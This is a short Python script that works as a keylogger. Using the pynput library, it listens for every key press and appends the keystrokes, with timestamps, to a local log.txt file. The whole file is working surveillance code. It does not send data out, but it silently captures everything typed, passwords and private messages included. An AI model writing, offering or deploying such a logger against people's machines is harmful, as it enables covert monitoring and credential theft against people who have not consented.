from pynput.keyboard import Listener
from datetime import datetime

with open("log.txt", 'a') as f:
    startup_time = datetime.now().strftime("[%H:%M] Program started\n")
    f.write(startup_time)


def write_to_file(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")

    match key_data:
        case "Key.enter":
            timestamp = datetime.now().strftime("[%H:%M]")
            key_data = f"\n{timestamp} "
        case "Key.backspace":
            key_data = ""
            with open("log.txt", 'rb+') as f:
                f.seek(0, 2)  # moves to the end of the log.txt file
                size = f.tell()
                if size > 0:
                    f.truncate(size - 1)
                return
        case "Key.space":
            key_data = " "
        case "Key.alt_l" | "Key.alt_r":
            key_data = ""
        case "Key.tab":
            key_data = ""
        case "Key.shift" | "Key.shift_r" | "Key.shift_l":
            key_data = ""
        case "Key.ctrl" | "Key.ctrl_r" | "Key.ctrl_l":
            key_data = " Ctrl + "
        case "Key.alt":
            key_data = ""
        case _ if key_data.startswith("Key."):
            return  # to skip other special keys
    with open("log.txt", 'a') as f:
        f.write(key_data)


with Listener(on_press=write_to_file) as l:
    l.join()
